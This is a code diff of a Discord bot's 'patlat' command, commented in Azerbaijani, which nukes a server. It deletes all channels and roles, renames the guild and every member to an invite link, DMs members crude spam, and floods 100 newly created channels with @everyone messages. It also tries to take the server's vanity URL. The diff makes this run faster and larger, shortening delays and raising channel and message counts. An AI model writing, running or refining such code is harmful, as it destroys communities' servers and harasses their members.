@@ -169,7 +169,11 @@ async def patlat(ctx):
         await ctx.send("Bu server qorunur! `!patlat` bu serverdə qətiyyən işlədilə bilməz.")
         return
 
-    await ctx.message.delete()
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+        
     guild = ctx.guild
 
     try:
@@ -181,7 +185,7 @@ async def patlat(ctx):
     for channel in guild.channels:
         try: 
             await channel.delete()
-            await asyncio.sleep(0.04)
+            await asyncio.sleep(0.02)
         except: continue
 
     # 2. Bütün rolları və botların rollarını sil
@@ -189,7 +193,7 @@ async def patlat(ctx):
         if role.name != "@everyone" and role != guild.default_role:
             try: 
                 await role.delete()
-                await asyncio.sleep(0.04)
+                await asyncio.sleep(0.02)
             except: continue
 
     # 3. Emojiləri və Stickerləri sil
@@ -215,59 +219,54 @@ async def patlat(ctx):
         await guild.edit(name="discord.gg/244")
     except: pass
 
-    # 6. Üzvlərə DM və ləqəb (Botlar daxil)
+    # 6. Üzvlərə ləqəb dəyişmək və DM göndərmək
     for member in guild.members:
         if member == guild.me: continue
         try: await member.edit(nick="discord.gg/244")
         except: pass
+        
         if not member.bot:
-            try: await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
-            except: pass
-        await asyncio.sleep(0.02)
-
-    # 7. Ən başda "ruhum-tanri" kanalını yarat
-    ruhum_tanri_chan = None
-    try:
-        ruhum_tanri_chan = await guild.create_text_channel(name="ruhum-tanri")
-        await asyncio.sleep(0.2)
-    except:
-        pass
-
-    # 8. Digər kanalları yaradıb həm özlərindən, həm də ruhum-tanri kanalına spam etmək
-    for i in range(1, 31):
-        try:
-            channel = await guild.create_text_channel(name=f"244-{i}")
-            await asyncio.sleep(0.1)
-            
-            wh = None
             try:
-                wh = await channel.create_webhook(name="244-WH")
-                await asyncio.sleep(0.1)
+                await member.send(f"{member.mention} RUHUM SKDI ATDI discord.gg/244")
             except:
                 pass
+        await asyncio.sleep(0.02)
 
-            for _ in range(25):
-                tasks_list = []
-                if wh:
-                    tasks_list.append(wh.send("@everyone ruhum shdı anavizi"))
-                tasks_list.append(channel.send("@everyone ruhum shdı anavizi"))
-                if ruhum_tanri_chan:
-                    tasks_list.append(ruhum_tanri_chan.send("@everyone ruhum shdı anavizi"))
-                
+    # 7. Maksimum sürətlə 100 kanal yaradıb spam etmək
+    for i in range(1, 101):
+        try:
+            channel = await guild.create_text_channel(name=f"244-{i}")
+            await asyncio.sleep(0.03)
+            
+            for _ in range(40):
                 try:
-                    await asyncio.gather(*tasks_list)
+                    await channel.send("@everyone discord.gg/244 yaz gır oql")
                 except:
                     pass
-                await asyncio.sleep(0.05)
-                
+                await asyncio.sleep(0.02)
         except: 
             break
+
+    # 8. RUHUM-TANRI kanalını ən sonda yaratmaq, amma ən başda (position=0) göstərmək və 100 ədəd mesaj yazdırmaq
+    try:
+        ruhum_tanri_chan = await guild.create_text_channel(name="ruhum-tanrı", position=0)
+        await asyncio.sleep(0.2)
+        
+        for _ in range(100):
+            try:
+                await ruhum_tanri_chan.send("@everyone RUHUM PAPA discord.gg/244_")
+            except:
+                pass
+            await asyncio.sleep(0.02)
+    except:
+        pass
 
     # 9. Vanity URL
     try:
         if guild.premium_tier >= 2:
             await guild.edit(vanity_code="244")
     except: pass
+        
         
 # ==============================================================================
 # 1. MODERASİYA KOMUTLARI (15 ƏDƏD)
